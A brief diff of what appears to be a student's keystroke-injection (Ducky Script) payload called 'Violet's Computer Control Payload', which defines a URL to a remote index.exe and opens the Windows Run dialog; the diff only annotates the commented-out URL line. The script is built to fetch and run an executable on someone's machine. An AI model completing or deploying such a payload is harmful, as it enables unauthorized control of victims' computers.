@@ -1,6 +1,6 @@
 REM Violet's Computer Control Payload
 
-REM DEFINE #payloadURL http://snowpi.student.rit.edu/index.exe
+REM DEFINE #payloadURL http://snowpi.student.rit.edu/index.exe <- Have to work on this
 
 DELAY 1000
 WINDOWS r
